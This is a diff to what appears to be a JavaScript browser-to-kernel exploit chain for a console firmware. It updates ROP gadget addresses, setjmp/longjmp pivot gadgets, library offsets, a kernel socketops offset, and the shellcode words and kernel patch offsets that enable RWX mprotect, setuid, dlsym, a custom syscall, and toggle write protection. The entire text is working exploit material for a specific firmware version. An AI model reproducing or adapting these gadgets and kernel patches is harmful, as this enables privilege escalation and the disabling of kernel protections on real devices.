@@ -20,9 +20,9 @@ window.stage2 = function () {
 
 gadgetcache = {
 	"ret": 0x0000003C,
-	"pop rdi": 0x0024CE6E,
+	"pop rdi": 0x0009E67D,
 	"pop rsi": 0x000756CB,
-	"pop rdx": 0x002A9BA2,
+	"pop rdx": 0x002516B2,
 	"pop rcx": 0x000348D3,
 	"pop r8": 0x00079211,
 	"pop r9": 0x000CDB41,
@@ -34,36 +34,36 @@ gadgetcache = {
 	"infloop": 0x00013AAE, //debug only
 
 	"mov [rdi], eax": 0x0001F878,
-	"mov rax, r8": 0x00288906,
+	"mov rax, r8": 0x00288926,
 
 	//branching
 	"sete al": 0x0001DE74,
 	"setne al": 0x00008FB0,
 	"setg al": 0x000E3A47,
-	"setge al": 0x006158E2,
-	"setl al": 0x0058C84C,
+	"setge al": 0x006158F2,
+	"setl al": 0x0058C85C,
 	"setle al": 0x000C94E6,
 	"cmp [rcx], edi": 0x0010CA51,
-	"shl rax, 3": 0x005DFD53,
+	"shl rax, 3": 0x005DFD63,
 	"add rax, rdx": 0x00AFEEC6,
 	"mov rax, [rax]": 0x0002DC22,
 	"xchg rax, rsp": 0x020A1E68,
 };
 
 var setJmpOffset = 0xC179C; // libk = 0x2C343;
-var setJmpGadget_one = 0x006CDE2B; //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]
-var setJmpGadget_two = 0x01873913; // mov rdi, qword ptr [rax + 0x10] ; jmp qword ptr [rax + 8]
+var setJmpGadget_one = 0x006CDE3B;  //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]
+var setJmpGadget_two = 0x01873923; // mov rdi, qword ptr [rax + 0x10] ; jmp qword ptr [rax + 8]
 
 var longJmpOffset = 0xC17F6; // libk = 0x2C39C;
-var longJmpGadget_one = 0x006CDE2B; //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]
-var longJmpGadget_two = 0x01873913; // mov rdi, qword ptr [rax + 0x10] ; jmp qword ptr [rax + 8]
+var longJmpGadget_one = 0x006CDE3B; //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]
+var longJmpGadget_two = 0x01873923; // mov rdi, qword ptr [rax + 0x10] ; jmp qword ptr [rax + 8]
 var pthread_create_np_offset = 0x259B0;
 var pthread_exit_offset = 0x1A240;
 var libk__error_offset = 0x16490;
 
 var libcint_memset_page_offset = 0x54000;
 var libk_stack_chk_fail_page_offset = 0x10000;
-var libwk_first_vt_entry_offset = 0x996C40;
+var libwk_first_vt_entry_offset = 0x996C50;
 
 var nogc = [];
 window.stage2_ = function () {
@@ -363,7 +363,7 @@ window.stage2_ = function () {
 	const PKTOPTS_TCLASS_OFFSET = 0xB0;
 
 	const KNOTE_KN_OFFSET = 0x60;
-	const KERNEL_SOCKETOPS_OFFSET = 0x1A89C48; //kernel offset
+	const KERNEL_SOCKETOPS_OFFSET = 0x1A8DC48; //kernel offset
 
 	const NUM_SPRAY_SOCKS = 0xC8;
 	const NUM_LEAK_SOCKS = 0xC8;
@@ -864,7 +864,7 @@ window.stage2_ = function () {
 
 	    //rwx mprotect
 	    mov rsi, 0x8B49909090909090
-	    mov qword ptr [rdi + 0x352258], rsi
+	    mov qword ptr [rdi + 0x352278], rsi
 
 	    //setuid
 	    mov dword ptr [rdi + 0x290E2], 0x000000B8
@@ -880,17 +880,17 @@ window.stage2_ = function () {
 	    mov byte ptr [rdi + 0x240270], 0x37
 
 	    //dlsym
-	    mov word ptr [rdi + 0x27F65A], 0xE990
+	    mov word ptr [rdi + 0x27F67A], 0xE990
 	    mov dword ptr [rdi + 0x1A810], 0xC3C03148
 	    
 
 	    //syscall 11
-	    mov qword ptr [rdi + 0x111B750], 0x2
+	    mov qword ptr [rdi + 0x111F750], 0x2
 	    mov rsi, 0x1827AC
 	    add rsi, rdi
-	    mov qword ptr [rdi + 0x111B758], rsi
+	    mov qword ptr [rdi + 0x111F758], rsi
 	    mov rsi, 0x0000000100000000
-	    mov qword ptr [rdi + 0x111B778], rsi
+	    mov qword ptr [rdi + 0x111F778], rsi
 
 
 	    //enable wp
@@ -940,7 +940,7 @@ window.stage2_ = function () {
 	exec_writer[24] = 0x9090BE48;
 	exec_writer[25] = 0x90909090;
 	exec_writer[26] = 0x89488B49;
-	exec_writer[27] = 0x352258B7;
+	exec_writer[27] = 0x352278B7;
 	exec_writer[28] = 0xE287C700;
 	exec_writer[29] = 0xB8000290;
 	exec_writer[30] = 0xC7000000;
@@ -957,21 +957,21 @@ window.stage2_ = function () {
 	exec_writer[41] = 0xC6370024;
 	exec_writer[42] = 0x24027087;
 	exec_writer[43] = 0xC7663700;
-	exec_writer[44] = 0x27F65A87;
+	exec_writer[44] = 0x27F67A87;
 	exec_writer[45] = 0xC7E99000;
 	exec_writer[46] = 0x01A81087;
 	exec_writer[47] = 0xC0314800;
 	exec_writer[48] = 0x87C748C3;
-	exec_writer[49] = 0x0111B750;
+	exec_writer[49] = 0x0111F750;
 	exec_writer[50] = 0x00000002;
 	exec_writer[51] = 0xACC6C748;
 	exec_writer[52] = 0x48001827;
 	exec_writer[53] = 0x8948FE01;
-	exec_writer[54] = 0x11B758B7;
+	exec_writer[54] = 0x11F758B7;
 	exec_writer[55] = 0x00BE4801;
 	exec_writer[56] = 0x01000000;
 	exec_writer[57] = 0x48000000;
-	exec_writer[58] = 0xB778B789;
+	exec_writer[58] = 0xF778B789;
 	exec_writer[59] = 0x0D480111;
 	exec_writer[60] = 0x00010000;
 	exec_writer[61] = 0x48C0220F;
